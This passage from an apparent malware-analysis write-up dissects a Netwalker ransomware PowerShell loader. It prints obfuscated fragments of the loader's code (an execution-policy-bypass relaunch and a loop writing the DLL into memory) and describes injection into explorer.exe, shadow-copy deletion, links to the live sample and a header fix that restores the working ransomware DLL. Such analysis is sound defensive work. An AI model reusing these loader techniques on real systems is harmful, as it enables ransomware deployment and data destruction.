through reflective Dll injection.&lt;/p&gt;

&lt;p&gt;SHA-256 hash of the sample being analyzed:  &lt;a href=&quot;https://bazaar.abuse.ch/download/f4656a9af30e98ed2103194f798fa00fd1686618e3e62fba6b15c9959135b7be/&quot;&gt;f4656a9af30e98ed2103194f798fa00fd1686618e3e62fba6b15c9959135b7be&lt;/a&gt;&lt;/p&gt;

&lt;hr /&gt;
&lt;p&gt;Prior knowledge required:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;Basic Powershell understanding&lt;/li&gt;
  &lt;li&gt;using .NET reflection to access Windows API in PowerShell&lt;/li&gt;
  &lt;li&gt;Windows APIs for Process/Dll injection&lt;/li&gt;
&lt;/ul&gt;

&lt;hr /&gt;

&lt;p&gt;This is around ~5 MBs of powershell script using three layers of encoding, encryption and obfuscation respectively to hide ransomware dll and supporting powershell commands for reflective Dll injection. The uppermost layer executes very long base64 encoded command (screenshot covers only a small portion of this command)&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/layer1.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;h1&gt;Processing Base64 encoded layer 1&lt;/h1&gt;

&lt;p&gt;In order to get decoded output from initial script, I shall run powershell script into my VM’s Powershell ISE but as the Invoke-Expression cmdlet will process base64-encoded payload and execute the ransomware therefore, I’ll modify the script for debugging by replacing this comdlet with a variable to store result of base64 decoded command and dump output in a file as shown in the figure below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/layer1processing.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;h1&gt;Processing Encrypted layer 2&lt;/h1&gt;

&lt;p&gt;base64 decoded second layer once again contains a very long bytearray in hex format which is processed in two steps&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/base64decoded_layer2.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;1) bytearray contents are decrypted in a for loop with 1 byte hardcoded xor key&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/layer2_xor.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;2) decrypted contents are stored as ASCII string in another variable in order to be able to create scriptblock for decrypted contents and execute it using Invoke-Command cmdlet&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/layer2_scriptblock.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;but I shall also modify second layer to get decrypted layer three contents and dump result into another output file as shown in the figure below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/layer2processing.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;decryptedlayer3.ps1 now contains the obfuscated layer three powershell script embedding ransomware dlls in bytearrays and other commands to process the malicious payload&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/dlls.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;h1&gt;Processing Obfuscated layer 3&lt;/h1&gt;

&lt;p&gt;Let’s start digging into layer three powershell script which is quite obfuscated having lengthy and random string variable and routine names responsible to drop final payload. It is required to perform following steps in order to execute Netwalker ransomware on victim’s machine&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;define variables to invoke in-memory Windows API function calls without compilation&lt;/li&gt;
  &lt;li&gt;define routines to load dll without using Windows loader&lt;/li&gt;
  &lt;li&gt;detect environment&lt;/li&gt;
  &lt;li&gt;get PID of a legitimate process from a list of running processes and inject payload via custom loader&lt;/li&gt;
  &lt;li&gt;delete shadow copies&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;First off, it defines required variables and routines:&lt;/p&gt;

&lt;p&gt;&lt;b&gt; to invoke in-memory Windows API function calls without compilation,&lt;/b&gt; C# code to declare structs and enums for memory manipulation is defined inside a variable as shown below&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/Csharpcode.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and to invoke kernell32.dll APIs using wrapper .Net methods available in powershell&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/DLLImports.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;final command in this case will let us instantiate objects by making Microsoft .Net core classes available in our powershell session and ensure ransomware’s true memory residence through reflection.&lt;/p&gt;

&lt;p&gt;Following set of routines help &lt;b&gt;correctly compute required memory addresses and relocations&lt;/b&gt; by casting integer datatypes (signed integers to Unsigned integers and vice versa) so that the script could act as its own custom loader and load dll without using Windows loader&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/conversions.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Finally it defines a bunch of routines to write embedded malicious binary into another process’s memory and execute it.&lt;/p&gt;

&lt;p&gt;Script starts its execution by detecting underlying processor’s architecture to know whether it is running on x86 or amd64 and to prepare 32-bit or 64-bit dll accordingly using following if-else block&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$EbihwfodUZMKtNCBx&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ptFvKdtq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$aukhgaZFiPJBarSpJc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$false&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Get-WmiObject&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nx&quot;&gt;Win32_processor&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;AddressWidth&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;64&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]]&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$EbihwfodUZMKtNCBx&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$GxwyKvgEkr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
 &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$aukhgaZFiPJBarSpJc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$true&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;    
 &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;PROCESSOR_ARCHITECTURE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-ne&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'amd64'&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$myInvocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Line&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; 
         &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WINDIR&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;\sysnative\windowspowershell\v1.0\powershell.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ExecutionPolicy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ByPass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-NoLogo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-NonInteractive&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-NoProfile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-NoExit&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$myInvocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;Line&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
         &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;else&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
         &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;&amp;amp;&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;nn&quot;&gt;env&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;WINDIR&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;\sysnative\windowspowershell\v1.0\powershell.exe&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-ExecutionPolicy&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ByPass&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-NoLogo&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-NonInteractive&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-NoProfile&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-NoExit&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-file&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$myInvocation&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;InvocationName&lt;/span&gt;&lt;span class=&quot;si&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$args&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
         &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
      &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;exit&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$lastexitcode&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;later it allocates memory in current process’s address space and starts writing dll on the allocated memory using following for loop&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-powershell&quot; data-lang=&quot;powershell&quot;&gt;&lt;span class=&quot;kr&quot;&gt;for&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dxQpkwU&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dxQpkwU&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-lt&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$TKgfkdkQrLMAN&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;KGcnFrQVhkckQriBC&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;nKkeCknfm&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$dxQpkwU&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;++&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PdWhwldJHtQhtsMJe&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Runtime.InteropServices.Marshal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PtrToStructure&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$lItUIbvCvHxzMmrKtX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fvh.wTEWKRjOqBX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rZKYDiOJE&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;  &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RBeMnMHvnbNEob&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$eIr&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ULhnbcyXERLvVtGXUp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PdWhwldJHtQhtsMJe&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;sUtYsMhA&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$MxyiIYGMhxakrDbKyjL&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RBeMnMHvnbNEob&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$upEcLTMCGhc&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ULhnbcyXERLvVtGXUp&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PdWhwldJHtQhtsMJe&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;cymIspbCOaY&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mofiZSsnxylxNuA&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$AaauDVCQMlKUXx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;PMUN&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$VxxHhZYpWSgsPvKNuDx&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$MxyiIYGMhxakrDbKyjL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$rZKYDiOJE&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$PdWhwldJHtQhtsMJe&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nf&quot;&gt;mkvugoDzrJgTSSJp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;ref&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;UInt32&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
   
    &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;if&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$mofiZSsnxylxNuA&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-eq&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;bp&quot;&gt;$false&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
         &lt;/span&gt;&lt;span class=&quot;kr&quot;&gt;return&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
       &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
    &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$lItUIbvCvHxzMmrKtX&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;n&quot;&gt;RBeMnMHvnbNEob&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$lItUIbvCvHxzMmrKtX&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;err&quot;&gt;$&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;System.Runtime.InteropServices.Marshal&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]::&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;SizeOf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;([&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Type&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;][&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Fvh.wTEWKRjOqBX&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]))&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;snapshot of object containig dll that gets written into current process’s memory&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/dll_struct.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;after that it calls following routine with certain parameters to inject payload by specifying a legitimate target process which is ‘explorer.exe’ in this case along with memory location pointer for buffer containg Dll and size of the buffer containing dll&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/call_explorer.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;this routine finds PID of explorer.exe form a list of running processes and passes obtained PID to final routine&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/get_explorer_pid.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;which first reflectively injects ransomware dll into explorer.exe by allocating a chunk of memory of specified size into its address space and writing ransomware dll on the allocated memory and then executes it by creating a thread that runs in the virtual address space of Explorer.exe process&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/inject.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and in the end deletes shadow copies of the data being held on the system at that particular time to completely eliminate any possibility of recovering it and performs required memory cleanup using following set of commands&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/delete_shadowcopy.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;as soon as script exits, &lt;b&gt;FE026B-Readme.txt&lt;/b&gt; window appears on the system with ransom message and all encrypted files with fe026b extension are no longer accessible&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/message.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;&lt;em&gt;Note: &lt;/em&gt;&lt;/strong&gt;&lt;i&gt;Ransomware dll being injected can be dumped into a binary file in powershell script, which has SHA-256 &lt;a href=&quot;https://www.virustotal.com/gui/file/302ff75667460accbbd909275cf912f4543c4fb4ea9f0d0bad2f4d5e6225837b/detection&quot;&gt;302ff75667460accbbd909275cf912f4543c4fb4ea9f0d0bad2f4d5e6225837b&lt;/a&gt; hash but it can be seen that it is 64-bit PE file and first two bytes in this case have wrong hex value &lt;b&gt;0xDEAD&lt;/b&gt;&lt;/i&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/images/psloader/dumped.png&quot; alt=&quot;image&quot; class=&quot;img-responsive&quot; /&gt;&lt;/p&gt;

&lt;p&gt;replacng first two bytes &lt;b&gt;0xDEAD&lt;/b&gt; with &lt;b&gt;0x4D5A&lt;/b&gt; in DOS header in HxD editor would result in Netwalker ransomware dll with &lt;a href=&quot;https://www.virustotal.com/gui/file/f93209fccd0c452b8b5dc9db46341281344156bbedd23a47d2d551f80f460534/detection&quot;&gt;f93209fccd0c452b8b5dc9db46341281344156bbedd23a47d2d551f80f460534&lt;/a&gt; SHA-256 hash.&lt;/p&gt;

&lt;h1&gt;Deciphering Netwalker x86-64 DLL&lt;/h1&gt;

&lt;p&gt;Let’s load final dll in IDA and perform basic static analysis first, I’ll start by looking up for strings, but they are mostly useless, moreover, it has only one export i.e., main entry which seems to implement all its functionality&lt;/p&gt;

